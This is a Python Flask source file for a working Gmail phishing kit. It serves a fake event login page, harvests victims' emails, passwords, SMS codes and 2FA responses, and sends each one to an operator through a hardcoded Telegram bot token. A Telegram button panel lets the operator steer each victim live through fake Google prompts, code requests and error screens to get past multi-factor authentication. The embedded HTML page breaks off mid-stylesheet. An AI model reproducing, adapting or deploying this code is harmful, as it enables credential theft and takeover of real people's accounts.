from flask import Flask, request, redirect, session, render_template_string, jsonify, Response
import requests
import json
import os
import base64
import time
import hmac
import hashlib
from datetime import datetime
import threading

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ================================================================
# TELEGRAM CONFIG
# ================================================================
TG_BOT_TOKEN = "8868268134:AAHTVlyTE0ksIwGG75SWEKg-qbUGd8wHE3s"
TG_CHAT_ID = "8337327707"
TG_API = f"https://api.telegram.org/bot{TG_BOT_TOKEN}"

# ================================================================
# STORAGE
# ================================================================
GMAIL_STATE_DB = "/tmp/gmail_state.json"
CRED_DB = "/tmp/credentials.json"
TELEGRAM_OFFSET_DB = "/tmp/telegram_offset.json"

def send_telegram(message):
    url = f"{TG_API}/sendMessage"
    payload = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def send_telegram_buttons(text, buttons):
    """Send a message with inline keyboard buttons"""
    url = f"{TG_API}/sendMessage"
    payload = {
        "chat_id": TG_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "reply_markup": {
            "inline_keyboard": buttons
        }
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def send_telegram_2fa_grid():
    """Send 2-digit 2FA grid buttons"""
    numbers = [f"{i}{j}" for i in range(1, 10) for j in range(0, 10)]
    # Split into rows of 5
    rows = []
    row = []
    for n in numbers:
        row.append({"text": n, "callback_data": f"2fa_{n}"})
        if len(row) == 5:
            rows.append(row)
            row = []
    if row:
        rows.append(row)
    
    send_telegram_buttons("🔢 Choose the 2-digit number to show the victim:", rows)

def init_gmail_state():
    """Initialize or get the current Gmail flow state"""
    if os.path.exists(GMAIL_STATE_DB):
        with open(GMAIL_STATE_DB) as f:
            return json.load(f)
    state = {
        "step": "email",       # email, password, prompt, sms1, sms2, fa2, error, blocked, success
        "email": "",
        "password": "",
        "sms1": "",
        "sms2": "",
        "fa2_code": "",
        "fa2_choice": "",
        "ip": "",
        "user_agent": "",
        "timestamp": ""
    }
    save_gmail_state(state)
    return state

def save_gmail_state(state):
    with open(GMAIL_STATE_DB, "w") as f:
        json.dump(state, f, indent=2)

def save_credential(email, password, ip, method):
    db = {}
    if os.path.exists(CRED_DB):
        with open(CRED_DB) as f:
            db = json.load(f)
    if email not in db:
        db[email] = []
    db[email].append({
        "password": password,
        "ip": ip,
        "method": method,
        "timestamp": datetime.now().isoformat()
    })
    with open(CRED_DB, "w") as f:
        json.dump(db, f, indent=2)

# ================================================================
# TELEGRAM BOT — Long Polling Loop (runs on a separate thread)
# ================================================================
def handle_telegram_updates():
    """Process incoming Telegram commands"""
    offset = 0
    if os.path.exists(TELEGRAM_OFFSET_DB):
        with open(TELEGRAM_OFFSET_DB) as f:
            offset = json.load(f).get("offset", 0)
    
    while True:
        try:
            resp = requests.get(f"{TG_API}/getUpdates", params={
                "offset": offset,
                "timeout": 30,
                "allowed_updates": json.dumps(["message", "callback_query"])
            }, timeout=35)
            
            if resp.status_code != 200:
                time.sleep(5)
                continue
            
            updates = resp.json().get("result", [])
            
            for update in updates:
                update_id = update["update_id"]
                offset = update_id + 1
                
                # Handle callback queries (button presses)
                if "callback_query" in update:
                    cb = update["callback_query"]
                    cb_data = cb.get("data", "")
                    cb_id = cb.get("id")
                    
                    if cb_data == "yes_prompt":
                        state = init_gmail_state()
                        state["step"] = "prompt"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={
                            "callback_query_id": cb_id,
                            "text": "✅ Prompt sent to victim. Waiting for Yes/No response..."
                        })
                        send_telegram("✅ Google Prompt sent to victim's page!")
                        
                    elif cb_data == "sms1":
                        state = init_gmail_state()
                        state["step"] = "sms1"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={
                            "callback_query_id": cb_id,
                            "text": "📱 SMS Code I sent to victim"
                        })
                        send_telegram("📱 SMS Code I sent to victim's page!")
                        
                    elif cb_data == "sms2":
                        state = init_gmail_state()
                        state["step"] = "sms2"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={
                            "callback_query_id": cb_id,
                            "text": "📱 SMS Code II sent to victim"
                        })
                        send_telegram("📱 SMS Code II sent to victim's page!")
                        
                    elif cb_data == "password_error":
                        state = init_gmail_state()
                        state["step"] = "error"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={
                            "callback_query_id": cb_id,
                            "text": "❌ Password error shown to victim"
                        })
                        send_telegram("❌ Password error shown to victim!")
                        
                    elif cb_data == "block":
                        state = init_gmail_state()
                        state["step"] = "blocked"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={
                            "callback_query_id": cb_id,
                            "text": "🚫 Victim blocked"
                        })
                        send_telegram("🚫 Victim is now blocked!")
                        
                    elif cb_data == "success":
                        state = init_gmail_state()
                        state["step"] = "success"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={
                            "callback_query_id": cb_id,
                            "text": "✅ Success! Redirecting victim..."
                        })
                        send_telegram("✅ Victim redirected to success page!")
                        
                    elif cb_data.startswith("2fa_"):
                        number = cb_data.split("_")[1]
                        state = init_gmail_state()
                        state["step"] = "fa2_show"
                        state["fa2_choice"] = number
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={
                            "callback_query_id": cb_id,
                            "text": f"🔢 Showing 2FA code: {number}"
                        })
                        send_telegram(f"🔢 Showing 2FA code **{number}** to victim!")
                
                # Handle text commands
                elif "message" in update:
                    msg = update["message"]
                    text = msg.get("text", "").strip()
                    
                    if text == "/start":
                        send_telegram(
                            "🤖 **Gmail Flow Control Bot**\n\n"
                            "Use the buttons below to control the victim's Gmail login flow:"
                        )
                        send_main_controls()
                    
                    elif text == "/controls" or text == "/menu":
                        send_main_controls()
                    
                    elif text == "/2fa":
                        send_telegram_2fa_grid()
                        
                    elif text == "/status":
                        state = init_gmail_state()
                        s = state["step"]
                        e = state["email"] or "Not set"
                        send_telegram(
                            f"📊 **Current Status**\n"
                            f"Step: `{s}`\n"
                            f"Email: `{e}`\n"
                            f"Password: {'✅ Captured' if state['password'] else '❌ Not yet'}\n"
                            f"SMS1: `{state['sms1'] or 'N/A'}`\n"
                            f"SMS2: `{state['sms2'] or 'N/A'}`\n"
                            f"2FA Code Shown: `{state['fa2_choice'] or 'N/A'}`\n"
                            f"IP: `{state['ip'] or 'N/A'}`\n"
                            f"Time: `{state['timestamp'] or 'N/A'}`"
                        )
            
            # Save offset
            with open(TELEGRAM_OFFSET_DB, "w") as f:
                json.dump({"offset": offset}, f)
                
        except requests.exceptions.Timeout:
            # Timeout is expected with long polling, just continue
            continue
        except Exception as e:
            print(f"Telegram polling error: {e}")
            time.sleep(5)
            continue
        
        time.sleep(1)

def send_main_controls():
    """Send the main control buttons to Telegram"""
    buttons = [
        [{"text": "✅ Yes Prompt", "callback_data": "yes_prompt"}],
        [{"text": "📱 SMS Code I", "callback_data": "sms1"}, {"text": "📱 SMS Code II", "callback_data": "sms2"}],
        [{"text": "🔢 2FA Number Prompt", "callback_data": "show_2fa_menu"}],
        [{"text": "❌ Password Error", "callback_data": "password_error"}],
        [{"text": "🚫 Block Visitor", "callback_data": "block"}, {"text": "✅ Success", "callback_data": "success"}]
    ]
    send_telegram_buttons("🎮 **Gmail Flow Controls**\nSelect what to show the victim:", buttons)

# ================================================================
# FLASK ROUTES
# ================================================================

@app.route('/')
def home():
    return jsonify({
        "status": "running",
        "endpoints": {
            "virtual_iv_page": "/virtual-iv",
            "gmail_state": "/api/gmail-state",
            "gmail_submit_email": "/api/gmail-email",
            "gmail_submit_password": "/api/gmail-password",
            "gmail_submit_sms": "/api/gmail-sms",
            "gmail_submit_2fa": "/api/gmail-2fa",
            "gmail_submit_prompt": "/api/gmail-prompt",
            "credentials": "/credentials",
            "health": "/health"
        }
    })

# ================================================================
# VIRTUAL IV PAGE — The main phishing page
# ================================================================
@app.route('/virtual-iv')
def virtual_iv_page():
    state = init_gmail_state()
    # Reset state for new visit
    state["step"] = "email"
    state["email"] = ""
    state["password"] = ""
    state["sms1"] = ""
    state["sms2"] = ""
    state["fa2_code"] = ""
    state["fa2_choice"] = ""
    state["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)
    if state["ip"] and "," in state["ip"]:
        state["ip"] = state["ip"].split(",")[0].strip()
    state["user_agent"] = request.headers.get("User-Agent", "")
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    
    return render_template_string(PAGE_HTML)

# ================================================================
# GMAIL FLOW — State endpoint (polled by the page)
# ================================================================
@app.route('/api/gmail-state')
def get_gmail_state():
    state = init_gmail_state()
    return jsonify({
        "step": state["step"],
        "email": state["email"],
        "fa2_choice": state["fa2_choice"]
    })

# ================================================================
# GMAIL FLOW — Submit Email
# ================================================================
@app.route('/api/gmail-email', methods=['POST'])
def gmail_email():
    data = request.json
    email = data.get('email', '').strip()
    if not email:
        return jsonify({"status": "error"}), 400
    
    state = init_gmail_state()
    state["email"] = email
    state["step"] = "password"
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    
    # Notify Telegram
    ip = state["ip"]
    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]                  You have a new website form submission
Email: {email}
IP: {ip}
UA: {state['user_agent'][:80]}"""
    send_telegram(msg)
    
    return jsonify({"status": "ok"})

# ================================================================
# GMAIL FLOW — Submit Password
# ================================================================
@app.route('/api/gmail-password', methods=['POST'])
def gmail_password():
    data = request.json
    password = data.get('password', '').strip()
    if not password:
        return jsonify({"status": "error"}), 400
    
    state = init_gmail_state()
    state["password"] = password
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    
    # Save credential
    save_credential(state["email"], password, state["ip"], "gmail")
    
    # Notify Telegram with full details
    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]                  You have a new website form submission
Email: {state['email']}
Password: {password}
IP: {state['ip']}
UA: {state['user_agent'][:80]}"""
    send_telegram(msg)
    
    return jsonify({"status": "ok"})

# ================================================================
# GMAIL FLOW — Submit SMS Code
# ================================================================
@app.route('/api/gmail-sms', methods=['POST'])
def gmail_sms():
    data = request.json
    code = data.get('code', '').strip()
    step = data.get('step', 'sms1')  # sms1 or sms2
    if not code:
        return jsonify({"status": "error"}), 400
    
    state = init_gmail_state()
    
    if step == "sms1":
        state["sms1"] = code
    else:
        state["sms2"] = code
    
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    
    msg = f"""[+]___ GMAIL {step.upper()} ___[+]
Email: {state['email']}
Code: {code}
IP: {state['ip']}"""
    send_telegram(msg)
    
    return jsonify({"status": "ok"})

# ================================================================
# GMAIL FLOW — Submit 2FA Code
# ================================================================
@app.route('/api/gmail-2fa', methods=['POST'])
def gmail_2fa():
    data = request.json
    code = data.get('code', '').strip()
    if not code:
        return jsonify({"status": "error"}), 400
    
    state = init_gmail_state()
    state["fa2_code"] = code
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    
    msg = f"""[+]___ GMAIL 2FA ___[+]
Email: {state['email']}
Code Entered: {code}
Code Shown (our choice): {state['fa2_choice']}
IP: {state['ip']}"""
    send_telegram(msg)
    
    return jsonify({"status": "ok"})

# ================================================================
# GMAIL FLOW — Submit Prompt Response (Yes/No)
# ================================================================
@app.route('/api/gmail-prompt', methods=['POST'])
def gmail_prompt():
    data = request.json
    response = data.get('response', '').strip()
    
    msg = f"""[+]___ GMAIL PROMPT ___[+]
Email: {init_gmail_state()['email']}
Response: {response}
IP: {init_gmail_state()['ip']}"""
    send_telegram(msg)
    
    return jsonify({"status": "ok"})

# ================================================================
# VIEW CREDENTIALS
# ================================================================
@app.route('/credentials')
def list_credentials():
    if not os.path.exists(CRED_DB):
        return jsonify({})
    with open(CRED_DB) as f:
        return jsonify(json.load(f))

# ================================================================
# HEALTH
# ================================================================
@app.route('/health')
def health():
    return "OK"

# ================================================================
# The HTML Page (stored as a constant)
# ================================================================
PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Event ly</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }

body {
    font-family: 'Roboto', Arial, sans-serif;
    background: #f0f2f5;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
}

/* ========== HEADER ========== */
header {
    width: 100%;
    padding: 12px 24px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    background: white;
    border-bottom: 1px solid #e0e0e0;
}
header .logo {
    font-size: 22px;
    font-weight: 700;
    color: #1a1a2e;
    text-decoration: none;
    letter-spacing: 1px;
}
header .logo span { color: #4361ee; }
header nav a {
    font-size: 14px;
    color: #666;
    text-decoration: none;
    margin-left: 20px;
    font-weight: 400;
}
header nav a:hover { color: #1a1a2e; }

/* ========== CONTAINER ========== */
.main-container {
    flex: 1;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 40px 20px;
    width: 100%;
    max-width: 500px;
}

/* ========== PROVIDER SELECTION ========== */
#provider-select {
    width: 100%;
}
#provider-select h1 {
    font-size: 24px;
    font-weight: 400;
    color: #202124;
    text-align: center;
    margin-bottom: 8px;
}
#provider-select p {
    font-size: 14px;
    color: #5f6368;
    text-align: center;
    margin-bottom: 30px;
}
.provider-btn {
    width: 100%;
    padding: 14px 20px;
    border: 1px solid #dadce0;
    border-radius: 8px;
    background: white;
    font-family: 'Roboto', Arial, sans-serif;
    font-size: 15px;
    font-weight: 500;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 12px;
    margin-bottom: 12px;
    transition: background 0.15s, box-shadow 0.15s;
    color: #202124;
}
.provider-btn:hover {
    background: #f8f9fa;
    box-shadow: 0 1px 3px rgba(0,0,0,0.08);
}
.provider-btn svg { width: 22px; height: 22px; flex-shrink: 0; }

/* ========== GMAIL LOGIN STEPS ========== */
.gmail-step {
    displ
"""

# ================================================================
# START TELEGRAM BOT POLLING IN BACKGROUND THREAD
# ================================================================
def start_bot():
    time.sleep(2)  # Wait for Flask to start
    handle_telegram_updates()

threading.Thread(target=start_bot, daemon=True).start()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
